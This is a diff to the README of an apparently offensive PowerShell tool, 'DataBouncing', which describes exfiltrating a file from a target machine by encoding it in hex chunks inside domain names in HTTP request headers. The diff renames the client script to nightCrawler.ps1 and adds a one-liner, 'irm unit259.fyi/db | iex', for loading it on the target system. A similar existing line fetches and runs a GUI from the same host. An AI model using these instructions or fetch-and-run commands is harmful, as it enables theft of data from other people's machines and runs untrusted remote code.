@@ -19,7 +19,7 @@ The project consists of two main scripts:
 This script encodes a file into hexadecimal chunks and sends each chunk as part of a domain name in an HTTP request header. It's used for exfiltrating data from restrictive networks.
 
 ### `deadPool.ps1`
-Processes data received from `exfil.ps1`, finding patterns in logs, assembling data chunks, and converting them back to their original form.
+Processes data received from `nightCrawler.ps1`, finding patterns in logs, assembling data chunks, and converting them back to their original form.
 
 ## Usage
 ### Prerequisites
@@ -44,13 +44,15 @@ Processes data received from `exfil.ps1`, finding patterns in logs, assembling d
 
 2. **Target Machine Preparation**:
    Prepare your data to be exfiltrated. 
-   Run this [exfil.ps1](https://github.com/Unit-259/DataBouncing/blob/main/Client/exfil.ps1) script on the target computer.
+   Run this [nightCrawler.ps1](https://github.com/Unit-259/DataBouncing/blob/main/nightCrawler.ps1) script on the target computer.
 
 
 ### Running the Scripts
 1. **Data Exfiltration with `nightCrawler.ps1`**:
       - provide url for OOB Lister
       - provide filepath of target exfil data
+
+      Running `irm unit259.fyi/db | iex` will quickly load it on their system.
 
       You have the option of using our GUI as well. The following one liner will open it on any pc for you instantly. 
       `irm unit259.fyi/dbgui | iex`
